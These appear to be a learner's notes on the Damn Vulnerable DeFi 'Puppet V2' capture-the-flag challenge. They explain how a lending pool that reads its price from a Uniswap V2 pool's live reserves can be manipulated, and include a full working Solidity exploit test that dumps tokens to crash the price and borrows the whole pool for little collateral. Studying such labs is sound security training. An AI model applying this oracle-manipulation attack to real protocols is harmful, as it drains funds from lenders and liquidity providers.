# Puppet V2 Notes(wrote by myself)
- related files: src/puppet-v2/PuppetV2Pool.sol,test/puppet-v2/PuppetV2.t.sol
---
### 1. Bug = market crash(false data on oracle)

### 2. where? =
- damn-vulnerable-defi/src/puppet-v2/PuppetV2Pool.sol (50-61)

### 3. leaks reason?
- price = reservesWETH / reservesToken, read LIVE from the pool. After the dump: token reserve balloons (100 → ~10,100), WETH reserve drains (10 → ~0.1) → ratio collapses ~10,000x → pool thinks DVT is near-worthless → asks almost no WETH collateral.
```
    // Fetch the price from Uniswap v2 using the official libraries
    function _getOracleQuote(uint256 amount) private view returns (uint256) {
        (uint256 reservesWETH, uint256 reservesToken) =
            UniswapV2Library.getReserves({factory: _uniswapFactory, tokenA: address(_weth), tokenB: address(_token)});

        return UniswapV2Library.quote({amountA: amount * 10 ** 18, reserveA: reservesToken, reserveB: reservesWETH});
    }

```

-

### 4. how we breach it :
```solidity

    function test_puppetV2() public checkSolvedByPlayer {
        // 1. Let the Uniswap router pull our 10,000 DVT so it can swap them.
        token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE);

        // 2. Dump ALL our DVT into the tiny Uniswap pool -> crashes the token's
        //    spot price (x*y=k: token reserve balloons, WETH reserve drains).
        //    path = sell token, receive WETH. We take whatever WETH comes out.
        address[] memory path = new address[](2);
        path[0] = address(token);
        path[1] = address(weth);
        uniswapV2Router.swapExactTokensForTokens({
            amountIn: PLAYER_INITIAL_TOKEN_BALANCE,
            amountOutMin: 0,
            path: path,
            to: player,
            deadline: block.timestamp
        });

        // 3. Wrap our 20 ETH into WETH too (the pool only accepts WETH, not raw ETH).
        //    Now we hold ~9.9 WETH (from the swap) + 20 WETH = ~29.9 WETH.
        weth.deposit{value: player.balance}();

        // 4. Price is now crashed, so borrowing 1M DVT needs only ~29.5 WETH.
        //    Approve the pool to pull our WETH deposit.
        weth.approve(address(lendingPool), type(uint256).max);

        // 5. Borrow the ENTIRE pool. Tokens land in player (borrow has no recipient arg).
        lendingPool.borrow(POOL_INITIAL_TOKEN_BALANCE);

        // 6. Forward the loot to recovery to solve the challenge.
        token.transfer(recovery, POOL_INITIAL_TOKEN_BALANCE);
    }


```

